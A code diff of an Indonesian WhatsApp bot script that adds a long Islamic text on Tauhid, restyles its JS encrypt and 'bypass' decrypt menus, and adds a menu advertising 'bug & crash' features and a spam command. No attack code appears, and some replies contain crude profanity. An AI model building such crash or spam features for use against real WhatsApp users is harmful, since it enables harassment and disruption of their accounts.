+ let teks = `\`𝐒𝐄𝐌𝐔𝐀 𝐓𝐄𝐍𝐓𝐀𝐍𝐆 𝐀𝐋𝐋𝐀𝐇 ﷻ\`
+
+Assalamualaikum \`${pushname}\` 👋 Ini rangkuman lengkap tentang Allah ﷻ, Tuhan semesta alam. Baca pelan-pelan dan tadabburi.
+
+⌲ \`𝐓𝐀𝐔𝐇𝐈𝐃 𝐑𝐔𝐁𝐔𝐁𝐈𝐘𝐀𝐇\`
+Meyakini Allah satu-satunya Pencipta, Pemilik, Pengatur, Pemberi rezeki.
+┏━━━━━━━━
+┃1. Allah yang menciptakan langit, bumi, manusia, hewan, tumbuhan
+┃2. Allah yang mengatur rezeki, jodoh, ajal, hidup mati
+┃3. Tidak ada sekutu bagi-Nya dalam penciptaan dan pengaturan
+┃4. Dalil: "Allah Pencipta segala sesuatu" QS. Az-Zumar 62
+┗━━━━━━━━━━
+⌲ \`𝐓𝐀𝐔𝐇𝐈𝐃 𝐔𝐋𝐔𝐇𝐈𝐘𝐀𝐇\`
+Hanya Allah yang berhak disembah, tidak ada yang berhak disembah selain Dia.
+┏━━━━━━━━
+┃1. Sholat, puasa, zakat, doa, nadzar hanya untuk Allah
+┃2. Tidak boleh berdoa ke kuburan, wali, jin, benda
+┃3. Lailahaillallah maknanya: tidak ada ilah yang berhak disembah kecuali Allah
+┃4. Dalil: "Sembahlah Allah dan jangan sekutukan Dia dengan sesuatu pun" QS. An-Nisa 36
+┗━━━━━━━━━━
+⌲ \`𝐓𝐀𝐔𝐇𝐈𝐃 𝐀𝐒𝐌𝐀 𝐖𝐀 𝐒𝐈𝐅𝐀𝐓\`
+Menetapkan nama dan sifat Allah sesuai Al-Quran dan Sunnah tanpa tahrif, ta'til, takyif, tamtsil.
+┏━━━━━━━━
+┃1. Allah Maha Melihat, Maha Mendengar, Maha Mengetahui tanpa menyerupai makhluk
+┃2. Allah bersemayam di atas Arsy sesuai keagungan-Nya
+┃3. Tidak boleh mengatakan "Allah tidak punya tangan" atau "tangan Allah seperti tangan manusia"
+┃4. Dalil: "Tidak ada sesuatu pun yang serupa dengan Dia" QS. Asy-Syura 11
+┗━━━━━━━━━━
+⌲ \`𝐀𝐒𝐌𝐀𝐔𝐋 𝐇𝐔𝐒𝐍𝐀 99 𝐍𝐀𝐌𝐀 𝐀𝐋𝐋𝐀𝐇\`
+Nabi ﷺ bersabda: "Sesungguhnya Allah memiliki 99 nama, barangsiapa menghafalnya masuk surga." HR. Bukhari Muslim
+
+┏━━━━━━━━
+┃1. Ar-Rahman - Maha Pemurah
+┃2. Ar-Rahim - Maha Penyayang
+┃3. Al-Malik - Maha Merajai
+┃4. Al-Quddus - Maha Suci
+┃5. As-Salam - Maha Pemberi Keselamatan
+┃6. Al-Mu'min - Maha Pemberi Keamanan
+┃7. Al-Muhaimin - Maha Pengawas
+┃8. Al-Aziz - Maha Perkasa
+┃9. Al-Jabbar - Maha Kuasa
+┃10. Al-Mutakabbir - Maha Megah
+┃11. Al-Khaliq - Maha Pencipta
+┃12. Al-Bari' - Maha Mengadakan
+┃13. Al-Mushawwir - Maha Membentuk Rupa
+┃14. Al-Ghaffar - Maha Pengampun
+┃15. Al-Qahhar - Maha Memaksa
+┃16. Al-Wahhab - Maha Pemberi Karunia
+┃17. Ar-Razzaq - Maha Pemberi Rezeki
+┃18. Al-Fattah - Maha Pembuka
+┃19. Al-Alim - Maha Mengetahui
+┃20. Al-Qabidh - Maha Menyempitkan
+┃21. Al-Basith - Maha Melapangkan
+┃22. Al-Khafidh - Maha Merendahkan
+┃23. Ar-Rafi' - Maha Meninggikan
+┃24. Al-Mu'izz - Maha Memuliakan
+┃25. Al-Mudzil - Maha Menghinakan
+┃26. As-Sami' - Maha Mendengar
+┃27. Al-Bashir - Maha Melihat
+┃28. Al-Hakam - Maha Menetapkan Hukum
+┃29. Al-Adl - Maha Adil
+┃30. Al-Lathif - Maha Lembut
+┃31. Al-Khabir - Maha Mengetahui Rahasia
+┃32. Al-Halim - Maha Penyantun
+┃33. Al-Azim - Maha Agung
+┃34. Al-Ghafur - Maha Pengampun
+┃35. Asy-Syakur - Maha Pembalas Budi
+┃36. Al-Ali - Maha Tinggi
+┃37. Al-Kabir - Maha Besar
+┃38. Al-Hafizh - Maha Memelihara
+┃39. Al-Muqit - Maha Pemberi Kecukupan
+┃40. Al-Hasib - Maha Membuat Perhitungan
+┃41. Al-Jalil - Maha Luhur
+┃42. Al-Karim - Maha Pemurah
+┃43. Ar-Raqib - Maha Mengawasi
+┃44. Al-Mujib - Maha Mengabulkan
+┃45. Al-Wasi' - Maha Luas
+┃46. Al-Hakim - Maha Bijaksana
+┃47. Al-Wadud - Maha Pengasih
+┃48. Al-Majid - Maha Mulia
+┃49. Al-Ba'its - Maha Membangkitkan
+┃50. Asy-Syahid - Maha Menyaksikan
+┃51. Al-Haqq - Maha Benar
+┃52. Al-Wakil - Maha Pemelihara
+┃53. Al-Qawiy - Maha Kuat
+┃54. Al-Matin - Maha Kokoh
+┃55. Al-Waliy - Maha Pelindung
+┃56. Al-Hamid - Maha Terpuji
+┃57. Al-Muhshi - Maha Menghitung
+┃58. Al-Mubdi' - Maha Memulai
+┃59. Al-Mu'id - Maha Mengembalikan
+┃60. Al-Muhyi - Maha Menghidupkan
+┃61. Al-Mumit - Maha Mematikan
+┃62. Al-Hayy - Maha Hidup
+┃63. Al-Qayyum - Maha Berdiri Sendiri
+┃64. Al-Wajid - Maha Menemukan
+┃65. Al-Majid - Maha Mulia
+┃66. Al-Wahid - Maha Esa
+┃67. Al-Ahad - Maha Tunggal
+┃68. As-Shamad - Maha Dibutuhkan
+┃69. Al-Qadir - Maha Kuasa
+┃70. Al-Muqtadir - Maha Berkuasa
+┃71. Al-Muqaddim - Maha Mendahulukan
+┃72. Al-Mu'akhkhir - Maha Mengakhirkan
+┃73. Al-Awwal - Maha Awal
+┃74. Al-Akhir - Maha Akhir
+┃75. Azh-Zhahir - Maha Nyata
+┃76. Al-Bathin - Maha Tersembunyi
+┃77. Al-Wali - Maha Memerintah
+┃78. Al-Muta'ali - Maha Tinggi
+┃79. Al-Barr - Maha Dermawan
+┃80. At-Tawwab - Maha Penerima Taubat
+┃81. Al-Muntaqim - Maha Penyiksa
+┃82. Al-Afuww - Maha Pemaaf
+┃83. Ar-Ra'uf - Maha Pengasih
+┃84. Malikul Mulk - Pemilik Kerajaan
+┃85. Dzul Jalali wal Ikram - Pemilik Keagungan dan Kemuliaan
+┃86. Al-Muqsith - Maha Adil
+┃87. Al-Jami' - Maha Mengumpulkan
+┃88. Al-Ghaniy - Maha Kaya
+┃89. Al-Mughni - Maha Pemberi Kekayaan
+┃90. Al-Mani' - Maha Mencegah
+┃91. Adh-Dharr - Maha Pemberi Mudharat
+┃92. An-Nafi' - Maha Pemberi Manfaat
+┃93. An-Nur - Maha Pemberi Cahaya
+┃94. Al-Hadi - Maha Pemberi Petunjuk
+┃95. Al-Badi' - Maha Pencipta yang Tiada Tandingan
+┃96. Al-Baqi - Maha Kekal
+┃97. Al-Warits - Maha Pewaris
+┃98. Ar-Rasyid - Maha Pandai
+┃99. As-Shabur - Maha Sabar
+┗━━━━━━━━━━
+⌲ \`𝐒𝐈𝐅𝐀𝐓 𝐀𝐋𝐋𝐀𝐇 𝐘𝐀𝐍𝐆 𝐖𝐀𝐉𝐈𝐁 𝐃𝐈𝐊𝐄𝐓𝐀𝐇𝐔𝐈\`
+20 sifat wajib Allah:
+┏━━━━━━━━
+┃1. Wujud - Ada
+┃2. Qidam - Terdahulu tanpa awal
+┃3. Baqa' - Kekal tanpa akhir
+┃4. Mukhalafatu lil Hawadits - Berbeda dengan makhluk
+┃5. Qiyamuhu binafsih - Berdiri sendiri
+┃6. Wahdaniyyah - Esa
+┃7. Qudrah - Kuasa
+┃8. Iradah - Berkehendak
+┃9. Ilmu - Mengetahui
+┃10. Hayat - Hidup
+┃11. Sama' - Mendengar
+┃12. Bashar - Melihat
+┃13. Kalam - Berfirman
+┃14. Qadiran - Maha Kuasa
+┃15. Muridan - Maha Berkehendak
+┃16. Aliman - Maha Mengetahui
+┃17. Hayyan - Maha Hidup
+┃18. Sami'an - Maha Mendengar
+┃19. Bashiran - Maha Melihat
+┃20. Mutakalliman - Maha Berfirman
+┗━━━━━━━━━━
+⌲ \`𝐇𝐀𝐊 𝐀𝐋𝐋𝐀𝐇 𝐀𝐓𝐀𝐒 𝐇𝐀𝐌𝐁𝐀𝐍𝐘𝐀\`
+┏━━━━━━━━
+┃1. *Diibadahi saja* - Tidak menyekutukan-Nya
+┃2. *Bersyukur atas nikmat* - Syukur dengan hati, lisan, anggota badan
+┃3. *Tawakal* - Bersandar hanya kepada Allah setelah berusaha
+┃4. *Takut dan harap* - Takut azab-Nya, harap rahmat-Nya
+┃5. *Cinta kepada Allah* - Di atas cinta kepada selain-Nya
+┃6. *Taat kepada perintah-Nya* - Sholat, puasa, zakat, haji, berbakti orang tua
+┗━━━━━━━━━━
+⌲ \`𝐍𝐈𝐊𝐌𝐀𝐓 & 𝐊𝐄𝐁𝐄𝐒𝐀𝐑𝐀𝐍 𝐀𝐋𝐋𝐀𝐇\`
+┏━━━━━━━━
+┃1. Menciptakan manusia dari setetes mani
+┃2. Menjadikan malam untuk istirahat, siang untuk mencari rezeki
+┃3. Menurunkan hujan, menumbuhkan tanaman, mengalirkan sungai
+┃4. Menundukkan matahari, bulan, bintang untuk manusia
+┃5. Memberi pendengaran, penglihatan, akal, hati
+┃6. Mengampuni dosa hamba yang bertaubat walau sebanyak buih di lautan
+┗━━━━━━━━━━
+⌲ \`𝐘𝐀𝐍𝐆 𝐌𝐄𝐌𝐁𝐀𝐓𝐀𝐋𝐊𝐀𝐍 𝐓𝐀𝐔𝐇𝐈𝐃\`
+┏━━━━━━━━
+┃1. *Syirik Akbar* - Menyembah selain Allah, minta tolong ke kuburan, dukun
+┃2. *Syirik Asghar* - Riya, sum'ah, bersumpah selain Allah
+┃3. *Kufur Akbar* - Mendustakan Allah, Rasul, Al-Quran
+┃4. *Nifaq Akbar* - Menampakkan Islam tapi menyembunyikan kekufuran
+┃5. *Bid'ah* - Membuat ibadah baru yang tidak ada contoh dari Nabi ﷺ
+┗━━━━━━━━━━
+⌲ \`𝐀𝐌𝐀𝐋𝐀𝐍 𝐔𝐍𝐓𝐔𝐊 𝐌𝐄𝐍𝐃𝐄𝐊𝐀𝐓𝐊𝐀𝐍 𝐃𝐈𝐑𝐈 𝐊𝐄𝐏𝐀𝐃𝐀 𝐀𝐋𝐋𝐀𝐇\`
+┏━━━━━━━━
+┃1. *Dzikir* - Subhanallah, Alhamdulillah, Allahu Akbar, La ilaha illallah
+┃2. *Doa* - Berdoa di waktu mustajab: sepertiga malam, antara adzan iqamah
+┃3. *Tilawah Al-Quran* - Membaca dan mentadabburi maknanya
+┃4. *Tafakkur* - Memikirkan ciptaan Allah di langit dan bumi
+┃5. *Istighfar* - Minta ampun 100x sehari seperti Nabi ﷺ
+┃6. *Sholat Sunnah* - Rawatib, tahajjud, dhuha
+┗━━━━━━━━━━
+⌲ \`𝐀𝐘𝐀𝐓 𝐊𝐔𝐑𝐒𝐈 & 𝐀𝐘𝐀𝐓 𝐓𝐄𝐍𝐓𝐀𝐍𝐆 𝐀𝐋𝐋𝐀𝐇\`
+"Allah, tidak ada Tuhan selain Dia Yang Hidup kekal lagi terus menerus mengurus makhluk-Nya. 
+Tidak mengantuk dan tidak tidur. Kepunyaan-Nya apa yang di langit dan di bumi..." 
+QS. Al-Baqarah 255
+
+"Dialah Allah Yang tiada Tuhan selain Dia, Raja, Yang Maha Suci, Yang Maha Sejahtera..." 
+QS. Al-Hasyr 23-24
+
+⌲ \`𝐏𝐄𝐍𝐔𝐓𝐔𝐏\`
+Allah ﷻ berfirman: 
+"Aku sesuai persangkaan hamba-Ku kepada-Ku. Jika ia mengingat-Ku, Aku bersamanya." HR. Bukhari Muslim
+
+Kenali Allah melalui nama, sifat, dan ciptaan-Nya. 
+Semakin kenal, semakin cinta. Semakin cinta, semakin taat.
+
+"Ya Allah, aku memohon kepada-Mu dengan seluruh nama-Mu yang Engkau namakan diri-Mu dengannya, 
+atau yang Engkau ajarkan kepada salah satu makhluk-Mu, atau yang Engkau turunkan dalam kitab-Mu..."
+\`[☝️] 𝐋𝐀 𝐈𝐋𝐀𝐇𝐀 𝐈𝐋𝐀𝐋𝐋𝐀𝐇 [☝️]\`
+`
+
  const msg = generateWAMessageFromContent(
  m.chat,
  {
@@ -16055,7 +18824,24 @@ case 'encultra': {
 }
 
 case 'menuenc': {
- let teks = `\`𝗘𝗡𝗖𝗥𝗬𝗣𝗧 𝗠𝗘𝗡𝗨\`
+ try {
+  const fs = require('fs')
+  const { generateWAMessageFromContent, prepareWAMessageMedia, proto } = require("@whiskeysockets/baileys")
+
+  // ==========================================
+  // ANIMASI TRANSISI 4 LOADING EMOJI (SLEEP 1000)
+  // ==========================================
+  const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms))
+  const loadingEmojis = ["⏳", "⌛", "🕒", "🕘"]
+
+  for (let emoji of loadingEmojis) {
+   await Asepp.sendMessage(m.chat, {
+    react: { text: emoji, key: m.key }
+   })
+   await sleep(1000) // Jeda waktu 1000ms (1 detik) tiap emoji
+  }
+
+  let teks = `\`ＥＮＣＲＹＰＴ ＭＥＮＵ\`
 
 Hi \`${pushname}\` 👋 Ini command buat encrypt file JS lu. Semua mode no npm, tinggal reply file .js nya.
 
@@ -16081,78 +18867,127 @@ ${prefix}encinvis
 \`[🔒] 𝐄𝐍𝐂𝐑𝐘𝐏𝐓 𝐒𝐘𝐒𝐓𝐄𝐌 [🔒]\`
 `;
 
- const msg = generateWAMessageFromContent(
- m.chat,
- {
- viewOnceMessage: {
- message: {
- interactiveMessage: proto.Message.InteractiveMessage.create({
- body: proto.Message.InteractiveMessage.Body.create({
- text: ""
- }),
- footer: proto.Message.InteractiveMessage.Footer.create({
- text: teks
- }),
- header: proto.Message.InteractiveMessage.Header.create({
- hasMediaAttachment: true,
- videoMessage: (
- await prepareWAMessageMedia(
- { video: { url: "https://raw.githubusercontent.com/AsepXyz12/bot-wa-db/main/uploads/1778787435341.mp4" } },
- { upload: Asepp.waUploadToServer }
- )
- ).videoMessage,
- gifPlayback: true
- }),
- nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
- buttons: [
- {
- name: "single_select",
- buttonParamsJson: JSON.stringify({
- title: "© ENC MENU",
- sections: [{
- title: "Encrypt Command",
- highlight_label: "𝐄𝐍𝐂 𝐌𝐎𝐃𝐄 🔒",
- rows: [
- { title: "𝐄𝐧𝐜 𝐅𝐢𝐥𝐞", description: "Obfuscation basic", id: `${prefix}encfile` },
- { title: "𝐄𝐧𝐜 𝐔𝐥𝐭𝐫𝐚", description: "AES-256-GCM + Anti tamper", id: `${prefix}encultra` },
- { title: "𝐄𝐧𝐜 𝐈𝐧𝐯𝐢𝐬", description: "Invisible mode", id: `${prefix}encinvis` }
- ]
- }]
- })
- }
- ]
- })
- })
- }
- }
- },
- { quoted: m }
- );
+  // Menyiapkan video header Carousel dengan format playback looping permanen
+  const imgMedia = await prepareWAMessageMedia(
+   {
+    video: { url: "https://raw.githubusercontent.com/AsepXyz12/bot-wa-db/main/uploads/1778787435341.mp4" },
+    gifPlayback: true
+   },
+   {
+    upload: Asepp.waUploadToServer
+   }
+  )
 
- await Asepp.relayMessage(m.chat, msg.message, { messageId: msg.key.id });
+  const msg = generateWAMessageFromContent(
+   m.chat,
+   {
+    viewOnceMessage: {
+     message: {
+      messageContextInfo: {
+       deviceListMetadata: {},
+       deviceListMetadataVersion: 2
+      },
+      interactiveMessage: proto.Message.InteractiveMessage.create({
+       body: proto.Message.InteractiveMessage.Body.create({
+        text: "𝐁𝐚𝐩𝐚𝐤𝐥𝐮 𝐊𝐞𝐧𝐚 𝐄𝐧𝐜"
+       }),
+       contextInfo: {
+        mentionedJid: [m.sender],
+        forwardingScore: 999999,
+        isForwarded: true
+       },
+       carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
+        cards: [
+         {
+          header: proto.Message.InteractiveMessage.Header.create({
+           title: "",
+           gifPlayback: true,
+           hasMediaAttachment: true,
+           ...imgMedia
+          }),
+          footer: proto.Message.InteractiveMessage.Footer.create({
+           text: teks
+          }),
+          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+            messageParamsJson: JSON.stringify({
+             // FIX UTAMA: Mengisi data teks penawaran yang valid agar tombol tidak hilang kosongan
+             limited_time_offer: {
+              text: "𝐓𝐫𝐢𝐧𝐢𝐭𝐲 𝐕𝟏",
+              url: "https://t.me",
+              copy_code: "𝐄𝐍𝐂𝐑𝐘𝐏𝐓",
+              expiration_time: Date.now() + 86400000
+             },
+             bottom_sheet: {
+              in_thread_buttons_limit: 1, 
+              list_title: "Encrypt Menu List",
+              button_title: "Open Menu" 
+             }
+            }),
+            buttons: [
+             {
+              name: "quick_reply",
+              buttonParamsJson: JSON.stringify({
+               icon: "PROMOTION",
+               display_text: "Enc File",
+               id: `${prefix}encfile`
+              })
+             },
+             {
+              name: "quick_reply",
+              buttonParamsJson: JSON.stringify({
+               icon: "DOCUMENT",
+               display_text: "Enc Ultra",
+               id: `${prefix}encultra`
+              })
+             },
+             {
+              name: "quick_reply",
+              buttonParamsJson: JSON.stringify({
+               icon: "REVIEW",
+               display_text: "Enc Invis",
+               id: `${prefix}encinvis`
+              })
+             }
+            ]
+           })
+         }
+        ]
+       })
+      })
+     }
+    }
+   },
+   { quoted: m }
+  );
 
- // Kirim mp3
- await Asepp.sendMessage(
- m.chat,
- {
- audio: fs.readFileSync("./image/encnih.mp3"),
- mimetype: "audio/mp4",
- ptt: false
- },
- { quoted: m }
- );
+  // Mengirim pesan Carousel utama
+  await Asepp.relayMessage(m.chat, msg.message, { messageId: msg.key.id });
+
+  // REAKSI EMOJI CENTANG SUKSES SETELAH CAROUSEL BERHASIL TERKIRIM
+  await Asepp.sendMessage(m.chat, {
+   react: { text: "✅", key: m.key }
+  })
+
+  try {
+   await Asepp.sendMessage(
+    m.chat,
+    {
+     audio: fs.readFileSync("./image/encnih.mp3"),
+     mimetype: "audio/mp4",
+     ptt: false
+    },
+    { quoted: m }
+   );
+  } catch (e) {
+   console.log('Gagal kirim audio enc:', e.message)
+  }
+
+ } catch (e) {
+  console.log(e)
+  payreply(`Gagal memproses menu: ${e.message}`)
+ }
 }
-break;
-
-
-
-
-
-
-
-
-
-
+break
 
 case 'spamht': {
  try {
@@ -16772,8 +19607,17 @@ break
     }
     
 case "tourl": case 'ghupload': {
+
+ // =====================================
+ // OWNER ONLY
+ // =====================================
+ if (!isOwner) {
+ return payreply('❌ Owner only!')
+ }
+
+
     if (!m.quoted) return payreply("Reply media")
-    if (!isOwner) return payreply(mess.owner)
+     if (!m.isGroup) return payreply('cuma di grup ngentot')
 
     payreply("UPLOADING TO ALL PERMANENT SERVERS...")
 
@@ -16944,10 +19788,8 @@ if (!secondUrl) {
         )
 
         await Asepp.relayMessage(m.chat, msgii.message, { messageId: msgii.key.id })
+await Asepp.sendMessage(m.chat, { audio: fs.readFileSync("./image/ngentotlu.mp3"), mimetype: "audio/mpeg", ptt: false }, { quoted: m })
 
-        await Asepp.sendMessage(m.chat, {
-            react: { text: "OK", key: m.key }
-        })
 
     } catch (e) {
         console.log(e)
@@ -16955,6 +19797,7 @@ if (!secondUrl) {
     }
 }
 break;
+
 
 case 'tandatogc':
 case 'taggc': {
@@ -18572,10 +21415,13 @@ case 'decjs': {
 }
 
 case "allmenu": {
-    const nowJakarta = moment().tz('Asia/Jakarta');
-    await Asepp.sendMessage(m.chat, { react: { text: "👑", key: m.key } });
+    try {
+        const { prepareWAMessageMedia } = require("@whiskeysockets/baileys")
+        const fs = require('fs')
 
-    let teks = `\`𝗧𝗥𝗜𝗡𝗜𝗧𝗬 𝗩𝟭 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡\`
+        await Asepp.sendMessage(m.chat, { react: { text: "🚀", key: m.key } });
+
+                    let teks = `\`𝗧𝗥𝗜𝗡𝗜𝗧𝗬 𝗩𝟭 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡\`
     
 Hi \`${pushname}\` 👋 ${getGreeting(parseInt(nowJakarta.format('HH')))} I'm trinity, your WhatsApp assistant. I'm here to help you with various tasks and make things easier for you. ✨
        
@@ -18703,38 +21549,124 @@ Hi \`${pushname}\` 👋 ${getGreeting(parseInt(nowJakarta.format('HH')))} I'm tr
 → .yuri
 → .zettai
 `
+        const uploadedVideo = await prepareWAMessageMedia(
+            { video: { url: "https://raw.githubusercontent.com/AsepXyz12/bot-wa-db/main/uploads/1780888944937.mp4" }, gifPlayback: true },
+            { upload: Asepp.waUploadToServer }
+        )
 
-   
+        const listTombol = [
+            {
+                name: "cta_url",
+                buttonParamsJson: JSON.stringify({
+                    display_text: "Whatsapp Asepp",
+                    url: "https://wa.me/62881036109288"
+                })
+            },
+            {
+                name: "cta_url",
+                buttonParamsJson: JSON.stringify({
+                    display_text: "Telegram",
+                    url: "https://t.me/AsepXxnx"
+                })
+            },
+            {
+                name: "single_select",
+                buttonParamsJson: JSON.stringify({
+                    has_multiple_buttons: true,
+                    icon: "DOCUMENT",
+                    title: "𝐋𝐈𝐒𝐓 𝐌𝐄𝐍𝐔",
+                    sections: [
+                        {
+                            title: "❏ 𝐓𝐑𝐈𝐍𝐈𝐓𝐘 𝐌𝐄𝐍𝐔 𝐋𝐈𝐒𝐓",
+                            highlight_label: "Top Feature",
+                            rows: [
+                                {
+                                    title: "𝐀𝐥𝐥 𝐌𝐞𝐧𝐮",
+                                    description: "Display all available bot features",
+                                    id: ".allmenu",
+                                    icon: "DEFAULT"
+                                },
+                                {
+                                    title: "𝐁𝐮𝐠 𝐌𝐞𝐧𝐮",
+                                    description: "Display bug & crash features",
+                                    id: ".bugmenu",
+                                    icon: "BUG"
+                                },
+                                {
+                                    title: "𝐎𝐰𝐧𝐞𝐫 𝐌𝐞𝐧𝐮",
+                                    description: "Display owner control features",
+                                    id: ".ownermenu",
+                                    icon: "SECURITY"
+                                },
+                                {
+                                    title: "𝐅𝐮𝐧 𝐌𝐞𝐧𝐮",
+                                    description: "Display fun & entertainment features",
+                                    id: ".funmenu",
+                                    icon: "MESSAGE"
+                                },
+                                {
+                                    title: "𝐂𝐩𝐚𝐧𝐞𝐥 𝐌𝐞𝐧𝐮",
+                                    description: "Display cpanel management features",
+                                    id: ".cpanelmenu",
+                                    icon: "LAPTOP"
+                                },
+                                {
+                                    title: "𝗡𝘀𝗳𝘄 𝗠𝗲𝗻𝘂",
+                                    description: "Display general utility features",
+                                    id: ".nsfwmenu",
+                                    icon: "STAR"
+                                },
+                                {
+                                    title: "𝐓𝐡𝐚𝐧𝐤𝐬 𝐓𝐨",
+                                    description: "Display support & credits",
+                                    id: ".tqto",
+                                    icon: "HEART"
+                                },
+                                {
+                                    title: "𝐒𝐜𝐫𝐢𝐩𝐭",
+                                    description: "Display script information",
+                                    id: ".sc",
+                                    icon: "DOCUMENT"
+                                },
+                                {
+                                    title: "𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫",
+                                    description: "Display developer contact",
+                                    id: ".owner",
+                                    icon: "STAR"
+                                }
+                            ]
+                        }
+                    ]
+                })
+            }
+        ];
 
-let msg = messageBuilder({
-        text: teks,
-        footer: "© Asep",
-        location: {
-            lat: -6.200000,  // ganti lat lu
-            lng: 106.816666, // ganti lng lu
-            name: "Jakarta",
-            address: "Indonesia"
-        },
-        buttons: [
-            { id: ".bugmenu", text: "ASEP" },
-            { id: ".start", text: "MENU" }
-        ]
-    })
+        let msgData = messageBuilder({
+            text: teks,
+            footer: "© Asep",
+            videoMessage: uploadedVideo.videoMessage,
+            buttons: listTombol,
+            mentions: [m.sender]
+        })
 
-    await Asepp.sendMessage(m.chat, msg, { quoted: lol });
+        await Asepp.relayMessage(m.chat, msgData.viewOnceMessage.message, { messageId: m.key.id })
 
-    await Asepp.sendMessage(
-        m.chat,
-        {
-            audio: fs.readFileSync("./image/decnih.mp3"),
-            mimetype: "audio/mp4",
-            ptt: false
-        },
-        { quoted: qkontak }
-    );
+        if (fs.existsSync("./image/whha.mp3")) {
+            await Asepp.sendMessage(
+                m.chat,
+                {
+                    audio: fs.readFileSync("./image/whha.mp3"),
+                    mimetype: "audio/mp4",
+                    ptt: false
+                },
+                { quoted: m }
+            )
+        }
+    } catch (err) {
+        console.log(err)
+    }
 }
 break
-
 
 case 'offantitag':
 case 'offantitagall': {
@@ -19417,6 +22349,14 @@ case 'warn': {
  // =====================================
  // OWNER ONLY
  // =====================================
+ if (!isOwner) {
+ return payreply('❌ Owner only!')
+ }
+
+
+ // =====================================
+ // OWNER ONLY
+ // =====================================
 if (!isAdmins &&!isOwner) return payreply(mess.owner)
  
 
@@ -20030,7 +22970,7 @@ case "joingc": {
 break
 case 'menudec': {
 
-let teks = `\` 𝐄𝐥 𝐁𝐲𝐩𝐚𝐬𝐬 𝐉𝐢𝐫𝐫 \`
+ let teks = `\` 𝐄𝐥 𝐁𝐲𝐩𝐚𝐬𝐬 𝐉𝐢𝐫𝐫 \`
 
 Hallo *${pushname}* 👋
 
@@ -20080,80 +23020,152 @@ Reply file *.js* yang ingin diproses lalu pilih salah satu mode decrypt di bawah
 ┃   └ Telegram Source Decrypt
 ┗━━━━━━━━━━━━⬣
 
-┏━〔 𝐎𝐖𝐍𝐄𝐑 〕━⬣
+┏━〔 𝐎𝐖𝐍𝐄Ｒ 〕━⬣
 ┃ 👑 Asepp
 ┃ 🛸 Unooo
 ┗━━━━━━━━━━━━⬣
 
 \`[  𝐂𝐫𝐚𝐜𝐤 𝐗 𝐁𝐲𝐩𝐚𝐬𝐬  ]\``;
- const msg = generateWAMessageFromContent(
- m.chat,
- {
- viewOnceMessage: {
- message: {
- interactiveMessage: proto.Message.InteractiveMessage.create({
- body: proto.Message.InteractiveMessage.Body.create({
- text: ""
- }),
- footer: proto.Message.InteractiveMessage.Footer.create({
- text: teks
- }),
- header: proto.Message.InteractiveMessage.Header.create({
- hasMediaAttachment: true,
- videoMessage: (
- await prepareWAMessageMedia(
- { video: { url: "https://raw.githubusercontent.com/AsepXyz12/bot-wa-db/main/uploads/1779519649298.mp4" } },
- { upload: Asepp.waUploadToServer }
+
+ const { generateWAMessageFromContent, prepareWAMessageMedia, proto } = require("@whiskeysockets/baileys")
+ const fs = require('fs')
+
+ // Menyiapkan video header Carousel dengan format playback looping permanen
+ const imgMedia = await prepareWAMessageMedia(
+  {
+   video: { url: "https://raw.githubusercontent.com/AsepXyz12/bot-wa-db/main/uploads/1779519649298.mp4" },
+   gifPlayback: true
+  },
+  {
+   upload: Asepp.waUploadToServer
+  }
  )
- ).videoMessage,
- gifPlayback: true
- }),
- nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
- buttons: [
- {
- name: "single_select",
- buttonParamsJson: JSON.stringify({
- title: "© DEC MENU",
- sections: [{
- title: "Decrypt Command",
- highlight_label: "𝐃𝐄𝐂 𝐌𝐎𝐃𝐄 🔓",
- rows: [
- { title: "𝐃𝐞𝐤𝐜𝐣𝐬", description: "Decrypt standard", id: `${prefix}dekcjs` },
- { title: "𝐃𝐞𝐤𝐜𝐣𝐬 𝐕𝟐", description: "Decrypt version 2", id: `${prefix}dekcjs_v2` },
- { title: "𝐃𝐞𝐤𝐜𝐣𝐬 𝐕𝟑", description: "Decrypt version 3", id: `${prefix}dekcjs_v3` },
- { title: "𝐃𝐞𝐜𝐣𝐬", description: "Restore JS normal", id: `${prefix}decjs` },
- { title: "𝐃𝐞𝐜𝐣𝐬 𝐕𝐈𝐏", description: "VIP decrypt mode", id: `${prefix}decjs_vip` },
- { title: "𝐃𝐞𝐜𝐣𝐬 𝐓𝐞𝐥𝐞", description: "Telegram decrypt version", id: `${prefix}decjs_tele` }
- ]
- }]
- })
- }
- ]
- })
- })
- }
- }
- },
- { quoted: m }
+
+ const msg = generateWAMessageFromContent(
+  m.chat,
+  {
+   viewOnceMessage: {
+    message: {
+     messageContextInfo: {
+      deviceListMetadata: {},
+      deviceListMetadataVersion: 2
+     },
+     interactiveMessage: proto.Message.InteractiveMessage.create({
+      body: proto.Message.InteractiveMessage.Body.create({
+       text: " 𝐀𝐔𝐓𝐎 𝐃𝐄𝐂𝐎𝐃𝐄 𝐁𝐀𝐏𝐀𝐊𝐋𝐔 "
+      }),
+      contextInfo: {
+       mentionedJid: [m.sender],
+       forwardingScore: 999999,
+       isForwarded: true
+      },
+      carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
+       cards: [
+        {
+         // FIX PERMANENT AUTO-PLAY: Parameter gifPlayback dikunci nempel di Header Card
+         header: proto.Message.InteractiveMessage.Header.create({
+          title: "",
+          gifPlayback: true,
+          hasMediaAttachment: true,
+          ...imgMedia
+         }),
+         footer: proto.Message.InteractiveMessage.Footer.create({
+          text: teks
+         }),
+         nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+           messageParamsJson: JSON.stringify({
+            limited_time_offer: {
+             text: "𝐄𝐥 𝐁𝐲𝐩𝐚𝐬𝐬",
+             url: "https://t.me",
+             copy_code: "𝐁𝐘𝐏𝐀𝐒𝐒",
+             expiration_time: Date.now() + 86400000
+            },
+            bottom_sheet: {
+             in_thread_buttons_limit: 1, // Mengunci sisa tombol agar bersembunyi rapi di dalam panel pop-up
+             divider_indices: [],
+             list_title: "Decrypt Menu List",
+             button_title: "Open Menu" // Judul tombol pemicu panel di luar card
+            }
+           }),
